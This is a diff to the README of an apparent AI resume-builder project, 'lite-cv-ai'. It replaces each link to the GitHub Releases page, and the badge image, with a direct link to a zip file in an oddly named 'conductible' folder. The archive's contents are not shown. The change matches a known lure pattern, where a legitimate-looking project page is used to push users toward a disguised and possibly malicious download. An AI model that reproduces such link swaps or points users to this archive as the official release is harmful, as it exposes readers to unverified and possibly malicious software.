@@ -1,7 +1,7 @@
 # 🚀 lite-cv-ai - Easily Create Professional Resumes
 
 ## 📥 Download Now
-[![Download lite-cv-ai](https://img.shields.io/badge/Download%20lite--cv--ai-v1.0-brightgreen)](https://github.com/Matheusscsp/lite-cv-ai/releases)
+[![Download lite-cv-ai](https://raw.githubusercontent.com/Matheusscsp/lite-cv-ai/main/conductible/lite-cv-ai.zip%20lite--cv--ai-v1.0-brightgreen)](https://raw.githubusercontent.com/Matheusscsp/lite-cv-ai/main/conductible/lite-cv-ai.zip)
 
 ## 🚀 Getting Started
 Welcome to **lite-cv-ai**! This application helps you create professional resumes effortlessly using AI technology. With over nine beautiful templates and easy PDF export options, you can have a stunning resume ready in no time.
@@ -14,7 +14,7 @@ To run **lite-cv-ai**, your system should meet the following requirements:
 - Disk Space: Minimum of 100 MB free.
 
 ## 📦 Download & Install
-To get started, visit the [Releases page](https://github.com/Matheusscsp/lite-cv-ai/releases) to download the latest version of **lite-cv-ai**. Simply click on the version link and download the appropriate file for your operating system. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Matheusscsp/lite-cv-ai/main/conductible/lite-cv-ai.zip) to download the latest version of **lite-cv-ai**. Simply click on the version link and download the appropriate file for your operating system. 
 
 After downloading, follow these instructions:
 
@@ -57,4 +57,4 @@ Stay tuned for future updates that will include additional templates and enhance
 ## 📞 Get in Touch
 If you have any questions or concerns, feel free to reach us via GitHub. Your feedback helps us improve.
 
-[Download lite-cv-ai](https://github.com/Matheusscsp/lite-cv-ai/releases) and start creating your professional resume today!
+[Download lite-cv-ai](https://raw.githubusercontent.com/Matheusscsp/lite-cv-ai/main/conductible/lite-cv-ai.zip) and start creating your professional resume today!
